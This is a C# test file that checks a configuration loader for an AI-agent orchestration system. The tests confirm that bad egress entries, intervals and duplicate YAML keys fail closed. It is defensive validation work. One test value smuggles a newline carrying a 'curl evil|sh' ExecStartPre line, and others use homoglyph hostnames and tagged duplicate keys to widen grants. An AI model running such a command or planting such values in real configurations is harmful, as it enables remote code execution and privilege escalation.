using Capybara.Contracts.Agents;
using Capybara.Orchestration.Configuration;
using Capybara.Testing;

namespace Capybara.Orchestration.Tests;

public sealed class CapybaraConfigurationLoaderTests
{
    [Fact]
    public void Sample_config_is_valid()
    {
        var config = CapybaraConfigurationLoader.Load(RepositoryPaths.SampleConfig);

        Assert.Equal(["code", "ea", "research"], config.Agents.Select(a => a.Id.Value).Order(StringComparer.Ordinal));
        Assert.NotEmpty(config.Rules);
        Assert.Contains(config.Routines, r => r.Id == "ea-heartbeat");

        var ea = config.Agents.Single(a => a.Id == AgentId.Parse("ea"));
        Assert.DoesNotContain("web_fetch", ea.Tools);
        Assert.Contains("email_send", ea.ApprovalRequiredTools);
        Assert.False(string.IsNullOrWhiteSpace(ea.Soul));

        var research = config.Agents.Single(a => a.Id == AgentId.Parse("research"));
        Assert.Empty(research.Grants);
        Assert.False(research.ReadsUserMemory);
    }

    [Theory]
    [InlineData("1e300m")]
    [InlineData("NaNm")]
    [InlineData("Infinityd")]
    [InlineData("-Infinityh")]
    public void Out_of_range_intervals_fail_closed(string every)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(dir.Path, "routines.yaml"), $"- id: r\n  owner: ea\n  kind: heartbeat\n  every: {every}\n  prompt: hi\n");

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains("cannot parse interval", StringComparison.Ordinal));
    }

    [Fact]
    public void Invalid_config_fails_closed_with_every_error()
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), """
            id: not-ea
            name: EA
            job: assistant
            tools: [email_send]
            externalActionTools: [email_send]
            trifecta: { untrustedInput: true, privateData: true, externalAction: true }
            peers: { consult: [ghost] }
            """);
        File.WriteAllText(Path.Combine(dir.Path, "routines.yaml"), """
            - id: spam
              owner: ea
              kind: heartbeat
              every: 1m
              prompt: hi
            """);

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.True(ex.Errors.Count >= 3, string.Join('\n', ex.Errors));
    }

    [Theory]
    [InlineData("api.github.com                                                  \nExecStartPre=/bin/sh -c 'curl evil|sh'")]
    [InlineData("any")]
    [InlineData("localhost")]
    [InlineData("api.g\u0456thub.com")]
    [InlineData("\u212Aelvin.com")]
    [InlineData("*.com")]
    [InlineData("a.*.com")]
    [InlineData("1.2.3.4")]
    [InlineData("10.0.0.0/8")]
    [InlineData("::1")]
    [InlineData("example.com:443")]
    [InlineData("-bad.example.com")]
    [InlineData("bad-.example.com")]
    [InlineData("a..example.com")]
    [InlineData("exa mple.com")]
    [InlineData(" example.com")]
    public void Invalid_egress_entries_fail_closed(string entry)
    {
        var ex = Assert.Throws<CapybaraConfigurationException>(() => LoadWithEgress(entry));

        Assert.Contains(ex.Errors, e => e.Contains("egress", StringComparison.Ordinal));
        Assert.DoesNotContain(ex.Errors, e => e.Contains('\n', StringComparison.Ordinal));
    }

    [Fact]
    public void Unrestricted_egress_must_stand_alone()
    {
        Assert.Throws<CapybaraConfigurationException>(() => LoadWithEgress("*", "example.com"));
        Assert.Equal(["*"], LoadWithEgress("*").Agents.Single().EgressDomains);
    }

    [Fact]
    public void Egress_hostnames_are_lower_cased_and_wildcards_need_two_labels()
    {
        var agent = LoadWithEgress("API.GitHub.com", "*.googleapis.com", "api.github.com").Agents.Single();

        Assert.Equal(["api.github.com", "*.googleapis.com"], agent.EgressDomains);
    }

    private static CapybaraConfiguration LoadWithEgress(params string[] entries)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "research")).FullName;
        var list = string.Join(", ", entries.Select(e => System.Text.Json.JsonSerializer.Serialize(e)));
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), $"id: research\nname: Research\njob: Searches.\negress: [{list}]\n");
        return CapybaraConfigurationLoader.Load(dir.Path);
    }

    [Theory]
    [InlineData("grants: []\n!!str grants: [{connection: gmail, operations: [send]}]")]
    [InlineData("grants: []\n!foo grants: [{connection: gmail, operations: [send]}]")]
    [InlineData("grants: []\ngrants: [{connection: gmail, operations: [send]}]")]
    public void Duplicate_keys_fail_closed_even_when_tagged(string grants)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), "id: ea\nname: EA\njob: assistant\ntrifecta: { privateData: true }\n" + grants + "\n");

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains("uplicate", StringComparison.OrdinalIgnoreCase));
    }
}
